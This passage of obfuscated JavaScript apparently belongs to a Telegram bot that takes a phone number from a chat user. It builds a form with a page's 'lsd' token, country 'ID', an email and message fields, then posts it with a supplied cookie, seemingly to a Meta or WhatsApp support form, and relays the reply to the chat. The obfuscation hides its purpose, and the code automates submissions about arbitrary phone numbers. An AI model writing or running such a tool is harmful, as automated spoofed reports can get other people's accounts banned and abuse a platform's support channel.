URLSearchParams();form[_0x3aec89(0xf1)](_0x3aec89(0xea),$form[_0x3aec89(0x102)](_0x3aec89(0xfa))[_0x3aec89(0x10e)]()),form[_0x3aec89(0xf1)](_0x3aec89(0xe4),$form[_0x3aec89(0x102)]('input[name=lsd]')[_0x3aec89(0x10e)]()),form['append']('step',_0x3aec89(0x103)),form[_0x3aec89(0xf1)]('country_selector','ID'),form['append']('phone_number',num),form[_0x3aec89(0xf1)](_0x3aec89(0x112),email[_0x3aec89(0xe5)][0x0]),form[_0x3aec89(0xf1)](_0x3aec89(0x10c),email['data'][0x0]),form[_0x3aec89(0xf1)](_0x3aec89(0x107),_0x3aec89(0x10b)),form[_0x3aec89(0xf1)]('your_message',''+ckb),form[_0x3aec89(0xf1)](_0x3aec89(0x10a),'0'),form[_0x3aec89(0xf1)](_0x3aec89(0xfe),'1'),form['append'](_0x3aec89(0x108),''),form[_0x3aec89(0xf1)]('__req','8'),form['append'](_0x3aec89(0x101),_0x3aec89(0xf2)),form[_0x3aec89(0xf1)]('dpr','1'),form[_0x3aec89(0xf1)](_0x3aec89(0xec),'UNKNOWN'),form['append'](_0x3aec89(0x113),_0x3aec89(0xf6)),form[_0x3aec89(0xf1)]('__comment_req','0');let res=await axioss({'url':url,'method':_0x3aec89(0xe8),'data':form,'headers':{'cookie':cookie}});ctx[_0x3aec89(0xe6)](res['data']);}else ctx[_0x3aec89(0xe6)](_0x3aec89(0xf9),{'reply_to_message_id':ctx[_0x3aec89(0x105)][_0x3aec89(0xf8)]});
})

//_______________________________________________________________________\\

bot.launch();